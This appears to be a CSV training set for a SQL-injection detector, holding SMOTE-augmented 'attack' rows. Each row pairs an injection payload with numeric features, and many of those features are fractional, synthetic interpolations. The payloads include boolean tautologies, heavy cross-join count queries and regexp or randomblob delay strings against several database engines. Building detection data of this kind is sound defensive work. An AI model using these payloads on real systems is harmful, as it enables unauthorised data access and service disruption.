id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000211,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,1.8050371620253438,131.12600525545326,35.35615586748202,3.872988746214248,43.528768826503594,18.769849387971234,51.35615586748202,17.471231173496406,0.3329595288158264,0.14199078809649884,0.39167218700974166,0.13337749607793306,3.0,0.0,2.0,1.0,0.0,1.471231173496404,0.0,9.0,0.0,0.0,1.0,4.471231173496404,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.4712311734964042,0.0,0.4712311734964042,0.5287688265035958,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4712311734964043
SMOTE_000212,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.7808215953485388,120.17201608610024,29.235091640277282,4.04703617065456,65.64564148194098,8.0,33.35091640277284,13.175458201386421,0.5475239442026529,0.06693899532283072,0.27654858061883647,0.1089884798556798,0.0,1.0,0.47018328055456815,0.0,1.0,0.9999999999999999,0.0,4.4701832805545685,0.2350916402772842,0.0,2.0,2.4701832805545685,0.0,1.0,0.23509164027728421,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000213,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,2.102515843785826,66.03509461523994,25.73684398597453,3.8596154184850926,18.01754730761997,18.175437342683647,21.649125314632705,8.192984650303618,0.26660403370618113,0.28780279278513854,0.3268588174324892,0.11873435607619115,0.0,2.3684219929872654,1.0,0.0,0.0,1.5438593356709116,0.0,2.3684219929872654,0.0,0.45614066432908845,0.4561406643290886,2.543859335670912,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.5438593356709116,0.0,0.4561406643290884,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000214,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,0.32763154446834647,209.2009684800877,29.099946195550682,3.4771736121835093,111.79956956440546,12.0,63.00107608898635,22.400322826695906,0.5351128766741108,0.057402165317853485,0.30057127676179113,0.1069136812462446,4.0,0.0,0.0,0.0,1.0,2.0,0.0,7.600215217797271,1.8001076088986352,0.0,6.0,3.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000215,attack,boolean,"-4462%""  )   or 8571  =  8571--",nearest_attack_euclidean,R000041,1.542825022278116,31.889260678055734,15.0,3.2771582181779793,2.296420226018583,11.110739321944266,11.778521356111469,6.703579773981421,0.07154696930784105,0.35081763837154023,0.3664530884809281,0.2111823038396906,0.29642022601857865,0.7035797739814214,2.7035797739814216,0.0,0.0,0.9999999999999999,0.0,1.2964202260185793,0.7035797739814214,0.0,0.0,3.703579773981421,0.29642022601857865,0.7035797739814214,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.29642022601857865,0.7035797739814214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000216,attack,boolean,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",nearest_attack_euclidean,R000006,0.25799647515286195,194.41666392831496,29.921296448426947,3.6158107570220768,118.37037158741558,12.0,46.57407103146106,17.472221309438318,0.6094565407485137,0.061758712100292726,0.2390552226579037,0.0897295244932898,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.314814206292213,0.15740710314610615,0.0,6.0,3.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000217,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,2.459876171655836,135.82171959734882,30.364343919469764,4.2953721547773585,84.68217195973489,5.705429899337204,30.41085979867441,15.023257939602322,0.6259287100894074,0.041033951335784,0.22261143982626194,0.11042589874854672,1.364343919469764,1.9767420603976773,0.0,0.0,1.0,0.3410859798674408,0.0,3.341085979867442,0.0,0.0,3.0,1.3410859798674402,0.34108597986744094,0.6589140201325592,0.0,0.0,3.469446951953614e-18,0.34108597986744094,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.34108597986744094,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.341085979867441
SMOTE_000218,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,1.4642460939118986,202.9597947135075,29.446678071471805,3.5356990915802586,114.57342457177444,12.0,56.06643857056391,20.31993157116917,0.5664969518808799,0.0592412755307298,0.27460235940404676,0.09965941318434356,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.2132877141127825,1.106643857056391,0.0,6.0,3.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000219,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,0.1477970791296055,55.733776884951155,22.77180875852956,3.7510454730951617,12.77180875852956,20.0,17.92393625284319,5.038031873578404,0.22874715414478514,0.3590832588560412,0.32162261159988986,0.0905469753992839,0.0,0.9619681264215934,1.076063747156813,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,3.076063747156813,0.0,0.9619681264215934,0.03803187357840665,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000220,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,1.630417714103876,134.10538942858773,36.54098477778411,3.9318281593598847,45.011709936509746,19.046839746038987,51.02341987301949,19.023419873019492,0.3366616283751529,0.14065869240984935,0.3811895609581336,0.14149011825686408,4.011709936509746,0.0,2.0,1.0,0.0,1.5058549682548732,0.0,9.0,0.0,0.0,1.0,5.011709936509747,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.5058549682548733,0.0,0.5058549682548734,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0117099365097464
SMOTE_000221,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000068,1.249582699125338,369.0940536409806,40.78713008548082,3.6786981170765634,111.6039642393463,38.153461777749875,160.91088779484605,58.42573982903836,0.3029329728443648,0.10307241479710744,0.43588342145032843,0.15811119090819933,0.0,4.0,0.24257398290383636,0.0,0.0,2.2425739829038367,0.0,34.0,0.0,2.2425739829038362,3.029704068384654,14.910887794846037,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.24257398290383642,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.301982119673145,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,10.54455610257698
SMOTE_000222,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.2236474789973028,223.07519786758985,37.062759140154895,3.848570675368072,67.94138710232342,32.31379570077448,88.192423662943,34.62759140154895,0.304563482686425,0.14495824133841684,0.3953665257074543,0.15511175026770385,1.9372408598451054,0.0,0.12551828030978918,0.0,0.0,2.0,0.0,18.313795700774474,0.0,1.0627591401548946,3.0627591401548946,10.251036560619578,1.0,0.0,0.0627591401548947,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.9372408598451053,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.125518280309789,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.062759140154895
SMOTE_000223,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,1.4858495062520067,365.61588616822235,30.725992885513897,3.39366510521678,92.16390039719457,58.0,164.7259928855139,50.7259928855139,0.25183629618882764,0.15869811117913502,0.45069473316447894,0.13877085946755843,0.27400711448610315,0.0,3.0,0.0,0.0,2.725992885513897,0.0,34.0,0.0,0.0,0.7259928855138971,15.725992885513897,0.27400711448610304,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.725992885513897,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7259928855138971,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.451985771027793
SMOTE_000224,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000037,0.0958343078168568,37.837547833652565,14.040613041586859,2.7015609986180302,3.0,9.0,19.837547833652557,6.0,0.07932457933362408,0.23797373800087224,0.5240525239982555,0.15864915866724816,0.04061304158685908,0.0,2.0,0.0,0.0,0.9999999999999999,0.0,2.959386958413141,0.0,0.0,0.0,3.0,0.04061304158685913,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000225,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,2.663365695363312,139.945346808413,31.10487438623327,4.1265858779844375,75.15952757782026,6.525849263479927,39.629246317399634,18.630723649713197,0.5481455326647723,0.0451139368719809,0.2760014209110978,0.13073910955214904,1.2629246317399627,1.7370753682600373,0.0,0.0,0.5790251227533458,0.0,0.0,6.788773895219888,0.0,0.8419497544933084,2.1580502455066917,3.104874386233271,0.4209748772466543,0.5790251227533456,0.0,0.0,3.469446951953614e-18,-1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.4209748772466543,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000226,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.4840640921911655,142.9475020217268,32.54892943788292,4.12395072077214,75.24821572980485,14.79714516768778,37.601427416156106,15.300713708078055,0.5263449367113069,0.10318475627531486,0.2633083927981847,0.10716191421519353,0.0,1.0,2.0,0.0,1.0,1.8496431459609726,0.0,4.300713708078056,0.1503568540390274,0.0,2.0,4.849643145960973,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.8496431459609726,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8496431459609726
SMOTE_000227,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,0.4839466469564218,59.94434431938829,23.31849181850354,3.750510276320101,14.329622954625883,18.31849181850354,19.97773772775531,7.318491818503542,0.24127492000856823,0.3060943367761283,0.33240970838378003,0.12022103483152338,0.0,1.0,2.0,0.0,0.0,2.0,0.0,1.6592459092517693,0.0,0.3296229546258851,0.3296229546258851,4.0,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000228,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,0.4703835537059987,212.2756023909972,34.48680014064689,3.771118705437758,60.083067557430326,35.32453342709793,83.2453342709793,33.62266713548965,0.28243437995826504,0.16727333209233133,0.39215686274509803,0.1581354252043056,0.0,0.8377332864510353,2.0,0.0,0.0,2.0,0.0,17.811333567744825,0.0,1.1622667135489646,3.1622667135489646,10.649066854195858,0.0,0.8377332864510354,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.324533427097929,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.324533427097929
SMOTE_000229,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,2.14702814817461,161.72065664856373,34.90809849728456,4.2500431013327615,80.9117373405745,14.724295491853681,43.360328324281866,22.72429549185368,0.503628624437835,0.089727735929833,0.26726597928283785,0.13937766034949425,4.0,0.0,0.0,0.0,1.0,1.6360328324281865,0.0,5.272065664856373,0.0,3.180164162140933,3.636032832428187,5.180164162140933,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.6360328324281865,1.6360328324281868,0.0,0.6360328324281866,1.0,1.0,0.36396716757181335,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.636032832428187
SMOTE_000230,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,0.2926041283460123,351.25066291017004,40.82245468823066,3.790232071200324,117.00261524259489,34.73368203234598,146.82506993082552,52.68929570440365,0.33262377758284306,0.09912027437456815,0.41778773658407287,0.15046821145851594,4.0,0.0,0.0,0.0,0.0,1.0443863279423362,0.0,31.55613672057664,0.08877265588467242,2.0,4.0,11.044386327942336,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.9556136720576638,0.0,0.0,0.9556136720576638,1.0,0.04438632794233621,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.955613672057664,0.955613672057664,11.866841016172991
SMOTE_000231,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,0.49106432603204253,146.83522748917449,29.902935624097875,3.924041135486752,71.60274684342558,8.776515007217013,45.679450631314886,20.77651500721701,0.48611707428154316,0.060226669373744116,0.31165408666642247,0.14200216967829035,0.0,4.0,0.0,0.0,0.9029356240978736,2.0,0.0,6.388257503608505,2.0,0.1941287518042526,1.9029356240978736,3.4853218795106313,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.09706437590212638,0.9029356240978736,0.0,0.0,0.9029356240978736,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8058712481957473
SMOTE_000232,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,0.8808379150893361,357.4593317024294,41.18241646280367,3.7767955339336154,118.27033414878532,35.0,150.64174816523305,53.54724938841102,0.3309249481755346,0.09792044843819432,0.42137163479411804,0.1497829685921531,3.270334148785311,0.7296658512146893,0.0,0.0,0.0,1.1824164628036722,0.0,32.364832925607345,0.0,2.0,4.0,11.182416462803673,0.8175835371963276,0.18241646280367227,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.0
SMOTE_000233,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.8477452401778037,207.78916563692144,35.672735395317545,3.8101056832145086,63.018206185952636,29.876376632508073,82.48730034407966,32.407282474381056,0.3030337320594526,0.1434574074913869,0.3972713862404744,0.15623747420868608,1.7345470790635094,0.0,0.0,0.0,0.0,1.7345470790635094,0.0,17.46909415812702,0.0,1.0,3.0,9.203641237190528,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.7345470790635094,0.0,0.7345470790635094,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.469094158127018
SMOTE_000234,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,1.0085993885095403,150.54975149089353,32.848169909088135,4.109052828409281,72.69633981817626,14.15707185454101,47.15707185454101,16.539267963635254,0.4837354460888095,0.09272030105706029,0.31342134291755075,0.1101229099365795,0.7696339818176263,0.0,2.0,0.0,1.0,1.7696339818176263,0.0,6.0,0.0,0.0,2.0,4.769633981817626,0.7696339818176263,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.7696339818176263,1.0,0.23036601818237373,0.7696339818176263,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.769633981817626
SMOTE_000235,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.8758819754721219,137.87183970718468,30.971519934929926,4.007817615343656,67.95727990239489,8.49287998373248,43.95727990239489,17.46439991866241,0.4935832688098897,0.06162562886906148,0.31876515738091915,0.12602594494012975,0.4928799837324813,0.0,2.0,0.0,1.0,0.9999999999999999,0.0,6.4928799837324815,0.49287998373248143,0.0,2.4928799837324815,4.0,0.49287998373248143,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.5071200162675186,0.49287998373248143,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000236,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,1.145073124005741,156.49385491965137,32.33743005356576,4.088685379731944,73.58435751339144,18.0,44.49385491965137,20.41564248660856,0.4704320532876656,0.11506130728272221,0.28406297690750615,0.13044366252210596,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.415642486608561,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.5843575133914395,0.4156424866085605,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
